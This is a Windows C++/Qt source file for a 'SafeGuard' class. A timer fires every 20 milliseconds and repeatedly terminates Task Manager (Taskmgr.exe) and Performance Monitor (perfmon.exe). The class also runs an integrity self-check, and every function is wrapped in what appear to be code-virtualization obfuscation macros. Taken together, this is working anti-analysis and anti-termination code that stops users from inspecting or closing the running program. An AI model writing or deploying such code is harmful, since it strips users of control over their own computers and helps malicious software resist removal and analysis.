#include "SafeGuard.h"
#include <Windows.h>
#include <tlhelp32.h>
#include <string.h>
using namespace std;

int killTask(const QString& exe)
{
	VM_START
	//1、根据进程名称找到PID
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return -1;
	}

	BOOL    bRet = FALSE;
	DWORD dwPid = -1;
	while (Process32Next(hProcessSnap, &pe32))
	{
		//将WCHAR转成const char*
		int iLn = WideCharToMultiByte(CP_UTF8, 0, const_cast<LPWSTR> (pe32.szExeFile), static_cast<int>(sizeof(pe32.szExeFile)), NULL, 0, NULL, NULL);
		std::string result(iLn, 0);
		WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, static_cast<int>(sizeof(pe32.szExeFile)), const_cast<LPSTR> (result.c_str()), iLn, NULL, NULL);
		if (0 == strcmp(exe.toStdString().c_str(), result.c_str()))
		{
			dwPid = pe32.th32ProcessID;
			bRet = TRUE;
			break;
		}
	}

	CloseHandle(hProcessSnap);
	//2、根据PID杀死进程
	HANDLE hProcess = NULL;
	//打开目标进程
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	if (hProcess == NULL) {
		return -1;
	}
	//结束目标进程
	DWORD ret = TerminateProcess(hProcess, 0);
	if (ret == 0) {
		return -1;
	}

	return 0;
	VM_END
}

SafeGuard::SafeGuard()
	: QObject()
{
	VM_START
	timer = new QTimer(this);
	connect(timer, SIGNAL(timeout()), this, SLOT(doguard()));
	timer->start(20);
	VM_END
}

SafeGuard::~SafeGuard()
{
}

void SafeGuard::doguard()
{
	VM_START
	int CheckValGuard;
	CHECK_CODE_INTEGRITY(CheckValGuard, 0x6768A1F9)
	killTask(QString::fromLatin1("Taskmgr.exe"));
	killTask(QString::fromLatin1("taskmgr.exe"));
	killTask(QString::fromLatin1("perfmon.exe"));
	killTask(QString::fromLatin1("Perfmon.exe"));
	if (CheckValGuard != 0x6768A1F9)
	{
		qApp->quit();
	}
	VM_END
}
